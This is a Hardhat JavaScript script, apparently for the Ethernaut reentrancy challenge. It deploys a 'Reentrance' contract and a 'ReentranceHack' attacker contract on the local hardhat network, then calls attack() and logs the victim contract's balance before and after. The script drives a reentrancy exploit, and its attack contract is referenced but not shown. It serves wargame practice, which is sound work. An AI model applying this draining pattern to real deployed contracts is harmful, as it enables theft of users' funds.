const { network, deployments, ethers, getNamedAccounts } = require("hardhat");

async function main() {
  const [owner, addr1, addr2] = await ethers.getSigners();

  const Reentrance = await ethers.getContractFactory("Reentrance");
  const reentrance = await Reentrance.deploy();
  await reentrance.deployed();

  const ReentranceHack = await ethers.getContractFactory("ReentranceHack");
  const reentranceHack = await ReentranceHack.deploy(reentrance.address);
  await reentranceHack.deployed();

  const hacker = await reentrance.connect(addr1);
  const hackerHack = await reentranceHack.connect(addr1);

  // ------------ let's hack -------------
  const randomaddr = "0x92Cd849801A467098cDA7CD36756fbFE8A30A036";
  await reentrance.donate(randomaddr, {
    value: "10",
  });
  console.log(await ethers.provider.getBalance(reentrance.address));

  await hackerHack.attack({
    value: ethers.utils.parseEther("1"),
    // gasLimit: ethers.BigNumber.from(`1000000`),
  });
  console.log(await ethers.provider.getBalance(reentrance.address));
}

// hh run scripts/ethernaut1.js --network hardhat
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
